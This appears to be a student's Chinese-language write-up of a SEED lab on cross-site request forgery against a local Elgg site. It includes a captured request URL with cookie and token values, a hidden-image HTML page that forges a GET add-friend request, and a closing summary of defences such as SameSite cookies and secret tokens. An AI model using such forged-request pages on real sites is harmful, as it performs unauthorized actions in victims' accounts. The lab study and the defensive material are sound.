# 
#### 
![](/web-security/img/csrf-3.png)

访问www.seed-server.com使用boby登陆后，可以看到cookie已经被设置了。  


#### GET方式攻击
![](/web-security/img/csrf-4.png)

首先在Members页面里找一个用户添加为好友，观察并获取需要的字段。  
```
http://www.seed-server.com/action/friends/add?friend=58&__elgg_ts=1628987383&__elgg_token=8KUL361JTeIRnscFZfF9Fg&__elgg_ts=1628987383&__elgg_token=8KUL361JTeIRnscFZfF9Fg
```
添加好友的url是: http://www.seed-server.com/action/friends/add  
参数是friend 即用户的id  
Cookie: Elgg=2tfmbv4kf3ctd6cc779nm3sd9u  
__elgg_token 和 __elgg_ts 是Elgg服务应对CSRF的攻击(在这个实验环境中已关闭)  


**构建恶意页面**  
Alice的用户id是56  
width和height设置为1小到页面不可见
```
<html>
<body>
<h1>This page forges an HTTP GET request</h1>
<img src="http://www.seed-server.com/action/friends/add?friend=56" alt="image" width="1" height="1" />
</body>
</html>
```


在实验环境这一节中，下载的文件里有一个attacker文件夹  

![](/web-security/img/csrf-5.png)  


!!!warning  
    不知道是不是这个docker环境的原因，没成功。检查了Labsetup/image_www/elgg/Csrf.php中的validate函数，确实把csrf防御关闭了

#### POST方式攻击
同get请求


#### 防御方式
1.referer头: 它是用来记录请求是从哪一个页面发出的，它存储的是改网页的url。但是这个字段并不是很可靠，因为它会泄漏使用者的浏览历史，产生隐私泄漏问题。一些浏览器(或者扩展）和代理会将此字段删除以此保护用户隐私。  
2.同站cookie: 给cookie添加了一个特殊的属性称为SameSite属性,它是服务器进行设置的。它告诉浏览器cookie是否可以被跨站使用`Set-Cookie:键=值； HttpOnly; SameSite = strict` strict值不会与跨站请求一起发送。还有一个值是Lax(cookie只有在顶级导航的跨站请求可以一起发送)  
3.秘密令牌:   
  一种方法是在每个页面内嵌入一个随即的机密值。当发起请求后，该机密值就放在请求中。由于同源策略，不同源的页面不能访问此页面的内容，因此恶意页面无法在跨站请求种包含正确的机密值。  
  另一种方法是把一个机密值放在cookie中。当一个请求发起后，请求从cookie种读出该机密值并将它包含在请求的数据字段内。该字段独立于已被浏览器包含的cookie。由于同源策略，不同源的页面无法读取其他源cookie内容(尽管浏览器确实会自动附加cookie)

